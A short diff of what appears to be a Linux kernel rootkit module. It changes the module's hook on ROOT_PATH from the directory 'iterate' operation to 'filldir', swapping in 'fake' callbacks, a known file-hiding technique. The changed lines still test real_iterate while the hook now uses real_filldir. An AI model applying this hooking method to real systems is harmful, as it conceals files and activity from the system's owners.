@@ -52,7 +52,7 @@ init_module(void)
 {
     fm_alert("%s\n", "Greetings the World!");
 
-    set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate);
+    set_file_op(filldir, ROOT_PATH, fake_filldir, real_filldir);
 
     if (!real_iterate) {
         return -ENOENT;
@@ -67,7 +67,7 @@ cleanup_module(void)
 {
     if (real_iterate) {
         void *dummy;
-        set_file_op(iterate, ROOT_PATH, real_iterate, dummy);
+        set_file_op(filldir, ROOT_PATH, real_filldir, dummy);
     }
 
     fm_alert("%s\n", "Farewell the World!");
